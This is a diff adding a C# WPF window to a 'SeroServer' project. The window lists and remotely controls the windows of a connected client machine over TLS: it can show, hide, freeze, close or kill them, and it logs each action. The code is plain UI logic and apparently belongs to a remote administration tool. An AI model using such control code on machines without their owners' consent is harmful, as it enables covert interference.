@@ -1,0 +1,276 @@
+using System.Collections.ObjectModel;
+using System.ComponentModel;
+using System.Windows;
+using System.Windows.Data;
+using System.Windows.Threading;
+using DevExpress.Xpf.Core;
+using Newtonsoft.Json;
+using SeroServer.Net;
+using SeroServer.Protocol;
+
+namespace SeroServer.UI;
+
+public class WindowEntryVM
+{
+    private static readonly System.Windows.Media.Brush _hiddenBrush = MakeHiddenBrush();
+    private static System.Windows.Media.Brush MakeHiddenBrush()
+    {
+        var b = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x45, 0x48, 0x60));
+        b.Freeze();
+        return b;
+    }
+
+    public System.Windows.Media.ImageSource? Icon { get; set; }
+    public long   Handle      { get; set; }
+    public string Title       { get; set; } = "";
+    public string ClassName   { get; set; } = "";
+    public string ProcessName { get; set; } = "";
+    public int    Pid         { get; set; }
+    public bool   Visible     { get; set; }
+    public string HandleHex   => $"0x{Handle:X8}";
+    public string VisibleStr  => Visible ? "Yes" : "No";
+    public System.Windows.Media.Brush VisibleColor => Visible
+        ? System.Windows.Media.Brushes.MediumSeaGreen
+        : _hiddenBrush;
+}
+
+public partial class WindowManagerWindow : ThemedWindow
+{
+    private readonly TlsServer _server;
+    private readonly string    _clientId;
+    private readonly ObservableCollection<WindowEntryVM> _windows = [];
+    private          ICollectionView?  _view;
+    private          DispatcherTimer?  _autoRefresh;
+    private          string            _searchText = "";
+    private          bool              _disconnected;
+
+    public WindowManagerWindow(TlsServer server, string clientId, string label)
+    {
+        InitializeComponent();
+        RubberBandSelector.Enable(GridWins);
+        TypeToSelect.Enable(GridWins, o => (o as WindowEntryVM)?.Title ?? "");
+        _server   = server;
+        _clientId = clientId;
+        TxtTitle.Text = label;
+
+        _view = CollectionViewSource.GetDefaultView(_windows);
+        _view.Filter = FilterWindow;
+        GridWins.ItemsSource = _view;
+
+        _server.RegisterHandler(clientId, PacketType.WinListResult, OnList);
+        _server.ClientDisconnected += OnClientDisconnected;
+        Lang.LanguageChanged += ApplyLanguage;
+        ApplyLanguage();
+        Closed += (_, _) =>
+        {
+            _autoRefresh?.Stop();
+            _server.UnregisterHandler(clientId, PacketType.WinListResult);
+            _server.ClientDisconnected -= OnClientDisconnected;
+            Lang.LanguageChanged -= ApplyLanguage;
+        };
+
+        GridWins.MouseDoubleClick += (_, _) => SendAction("focus");
+
+        _autoRefresh = new DispatcherTimer { Interval = TimeSpan.FromSeconds(3) };
+        _autoRefresh.Tick += (_, _) => Refresh();
+        _autoRefresh.Start();
+        Refresh();
+    }
+
+    private void ApplyLanguage()
+    {
+        Title = Lang.Get("FEAT_WINDOW_MGR");
+        if (MnuWinShow     != null) MnuWinShow.Header     = Lang.Get("ACT_SHOW");
+        if (MnuWinHide     != null) MnuWinHide.Header     = Lang.Get("ACT_HIDE");
+        if (MnuWinFocus    != null) MnuWinFocus.Header    = Lang.Get("ACT_FOCUS");
+        if (MnuWinRestore  != null) MnuWinRestore.Header  = Lang.Get("ACT_RESTORE");
+        if (MnuWinMinimize != null) MnuWinMinimize.Header = Lang.Get("ACT_MINIMIZE");
+        if (MnuWinMaximize != null) MnuWinMaximize.Header = Lang.Get("ACT_MAXIMIZE");
+        if (MnuWinClose    != null) MnuWinClose.Header    = Lang.Get("ACT_CLOSE");
+        if (MnuWinKill     != null) MnuWinKill.Header     = Lang.Get("ACT_KILL_SHORT");
+        if (MnuWinFreeze   != null) MnuWinFreeze.Header   = Lang.Get("ACT_FREEZE");
+        if (MnuWinUnfreeze != null) MnuWinUnfreeze.Header = Lang.Get("ACT_UNFREEZE");
+        if (MnuWinCopyTitle   != null) MnuWinCopyTitle.Header   = Lang.Get("ACT_COPY_TITLE");
+        if (MnuWinCopyHandle  != null) MnuWinCopyHandle.Header  = Lang.Get("ACT_COPY_HANDLE");
+        if (MnuWinCopyProcess != null) MnuWinCopyProcess.Header = Lang.Get("ACT_COPY_PROCESS");
+        if (MnuWinRefresh     != null) MnuWinRefresh.Header     = Lang.Get("ACT_REFRESH");
+        if (ColWinProcess != null) ColWinProcess.Header = Lang.Get("WIN_COL_PROCESS");
+        if (ColWinTitle   != null) ColWinTitle.Header   = Lang.Get("WIN_COL_TITLE");
+        if (ColWinClass   != null) ColWinClass.Header   = Lang.Get("WIN_COL_CLASS");
+        if (ColWinPid     != null) ColWinPid.Header     = Lang.Get("PM_COL_PID");
+        if (ColWinHandle  != null) ColWinHandle.Header  = Lang.Get("WIN_COL_HANDLE");
+    }
+
+    // System background/input-method windows with no real UI — always hidden
+    private static readonly HashSet<string> _bgClasses = new(StringComparer.OrdinalIgnoreCase)
+    {
+        "MSCTFIME UI", "IME", "CiceroUIWndFrame", "ImmersiveBackgroundWindow",
+        "ApplicationManager_ImmersiveShellWindow", "Shell_TrayWnd",
+        "Progman", "WorkerW"
+    };
+
+    private bool FilterWindow(object obj)
+    {
+        var vm = (WindowEntryVM)obj;
+
+        // Hide known system background classes
+        if (_bgClasses.Contains(vm.ClassName)) return false;
+        // Hide zero-title windows whose class suggests no real UI (e.g. generic message-only WNDs)
+        if (string.IsNullOrWhiteSpace(vm.Title) && vm.ClassName.StartsWith("CiceroUI", StringComparison.OrdinalIgnoreCase))
+            return false;
+
+        if (string.IsNullOrWhiteSpace(_searchText)) return true;
+        return vm.Title.Contains(_searchText, StringComparison.OrdinalIgnoreCase)
+            || vm.ClassName.Contains(_searchText, StringComparison.OrdinalIgnoreCase)
+            || vm.ProcessName.Contains(_searchText, StringComparison.OrdinalIgnoreCase);
+    }
+
+    private void TxtSearch_TextChanged(object s, System.Windows.Controls.TextChangedEventArgs e)
+    {
+        _searchText = TxtSearch.Text;
+        _view?.Refresh();
+        TxtCount.Text = $"({_windows.Count(x => FilterWindow(x))}/{_windows.Count})";
+    }
+
+    private void Refresh()
+    {
+        if (_disconnected) return;
+        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WinGetList });
+    }
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected = true;
+            _autoRefresh?.Stop();
+            GridWins.Opacity = 0.55;
+            TxtStatus.Text   = Lang.Get("PM_DISCONNECTED");
+        });
+    }
+
+    private void OnList(Packet pkt)
+    {
+        try
+        {
+            var d = JsonConvert.DeserializeObject<WinListResultData>(pkt.Data);
+            if (d == null) return;
+            // Decode icons on UI (STA) thread — BitmapImage requires STA, not safe on threadpool
+            Dispatcher.BeginInvoke(() =>
+            {
+                var selectedHandles = GridWins.SelectedItems.Cast<WindowEntryVM>()
+                                              .Select(v => v.Handle).ToHashSet();
+                // Pin column widths before clear to prevent * column from jumping when items return
+                var savedColWidths = GridWins.Columns.Select(c => c.ActualWidth).ToArray();
+                _windows.Clear();
+                for (int ci = 0; ci < GridWins.Columns.Count && ci < savedColWidths.Length; ci++)
+                    if (savedColWidths[ci] > 0)
+                        GridWins.Columns[ci].Width = new System.Windows.Controls.DataGridLength(savedColWidths[ci]);
+                foreach (var w in d.Windows)
+                    _windows.Add(new WindowEntryVM
+                    {
+                        Handle      = w.Handle,
+                        Title       = w.Title,
+                        ClassName   = w.ClassName,
+                        ProcessName = w.ProcessName,
+                        Pid         = w.Pid,
+                        Visible     = w.Visible,
+                        Icon        = DecodeIcon(w.IconB64),
+                    });
+                _view?.Refresh();
+                if (selectedHandles.Count > 0)
+                    foreach (var vm in _windows.Where(v => selectedHandles.Contains(v.Handle)))
+                        GridWins.SelectedItems.Add(vm);
+                int visible = _windows.Count(x => FilterWindow(x));
+                TxtCount.Text  = $"({visible}/{d.Windows.Count})";
+                TxtStatus.Text = string.Format(Lang.Get("WIN_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Windows.Count);
+            });
+        }
+        catch { }
+    }
+
+    private void SendAction(string action)
+    {
+        if (_disconnected) return;
+        var sel = GridWins.SelectedItems.Cast<WindowEntryVM>().ToList();
+        if (sel.Count == 0) return;
+        if (action is "close" or "kill")
+        {
+            string label  = action == "close" ? Lang.Get("ACT_CLOSE") : Lang.Get("ACT_KILL_SHORT");
+            string detail = action == "kill" ? $"\n{Lang.Get("WIN_KILL_DETAIL")}" : "";
+            string msg    = sel.Count == 1
+                ? string.Format(Lang.Get("WIN_CONFIRM_1"), label, sel[0].Title) + detail
+                : string.Format(Lang.Get("WIN_CONFIRM_N"), label, sel.Count)    + detail;
+            if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes)
+                return;
+        }
+        foreach (var vm in sel)
+            _ = _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.WinAction,
+                Data = JsonConvert.SerializeObject(new WinActionData { Handle = vm.Handle, Action = action })
+            });
+        TxtStatus.Text = sel.Count == 1 ? $"{action} → {sel[0].Title}" : $"{action} → {sel.Count} windows";
+        ServerWindow.ReportGlobalActivity($"Window {action}", sel.Count == 1 ? sel[0].Title : $"{sel.Count} windows", "complete");
+        ServerWindow.LogGlobal($"[WIN] '{action}' on {(sel.Count == 1 ? $"'{sel[0].Title}'" : $"{sel.Count} windows")} — client {_clientId}.");
+    }
+
+    private void BtnRefresh_Click  (object s, RoutedEventArgs e) => Refresh();
+    private void BtnShow_Click     (object s, RoutedEventArgs e) => SendAction("show");
+    private void BtnHide_Click     (object s, RoutedEventArgs e) => SendAction("hide");
+    private void BtnFocus_Click    (object s, RoutedEventArgs e) => SendAction("focus");
+    private void BtnRestore_Click  (object s, RoutedEventArgs e) => SendAction("restore");
+    private void BtnMinimize_Click (object s, RoutedEventArgs e) => SendAction("minimize");
+    private void BtnMaximize_Click2(object s, RoutedEventArgs e) => SendAction("maximize");
+    private void BtnClose_Click2   (object s, RoutedEventArgs e) => SendAction("close");
+    private void BtnKill_Click     (object s, RoutedEventArgs e) => SendAction("kill");
+    private void BtnFreeze_Click   (object s, RoutedEventArgs e) => SendAction("freeze");
+    private void BtnUnfreeze_Click (object s, RoutedEventArgs e) => SendAction("unfreeze");
+
+    private void GridWins_CopyTitle_Click(object s, RoutedEventArgs e)
+    {
+        if (GridWins.SelectedItem is WindowEntryVM vm)
+            try { System.Windows.Clipboard.SetText(vm.Title); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Title); } catch { }
+    }
+
+    private void GridWins_CopyHandle_Click(object s, RoutedEventArgs e)
+    {
+        if (GridWins.SelectedItem is WindowEntryVM vm)
+            try { System.Windows.Clipboard.SetText(vm.HandleHex); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.HandleHex); } catch { }
+    }
+
+    private void GridWins_CopyProcess_Click(object s, RoutedEventArgs e)
+    {
+        if (GridWins.SelectedItem is WindowEntryVM vm)
+            try { System.Windows.Clipboard.SetText(vm.ProcessName); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.ProcessName); } catch { }
+    }
+
+    private void Close_Click(object s, RoutedEventArgs e) => Close();
+
+    private void GridWins_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
+    {
+        if (GridWins.SelectedItems.Count == 0) e.Handled = true;
+    }
+
+    private static readonly System.Windows.Media.ImageSource _fallbackIcon = MakeFallbackIcon();
+    private static System.Windows.Media.ImageSource MakeFallbackIcon()
+    {
+        var dg    = new System.Windows.Media.DrawingGroup();
+        var frame = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x35, 0x48, 0x80));
+        var title = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x4A, 0x85, 0xF5));
+        var body  = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x18, 0x20, 0x40));
+        using (var ctx = dg.Open())
+        {
+            ctx.DrawRoundedRectangle(frame, null, new System.Windows.Rect(0, 0, 16, 13), 1.5, 1.5);
+            ctx.DrawRectangle(title, null, new System.Windows.Rect(1, 1, 14, 3.5));
+            ctx.DrawRectangle(body,  null, new System.Windows.Rect(1, 4.5, 14, 7.5));
+        }
+        var img = new System.Windows.Media.DrawingImage(dg);
+        img.Freeze();
+        return img;
+    }
+
+    private static System.Windows.Media.ImageSource? DecodeIcon(string b64)
+        => UiHelpers.DecodeIcon(b64) ?? _fallbackIcon;
+}
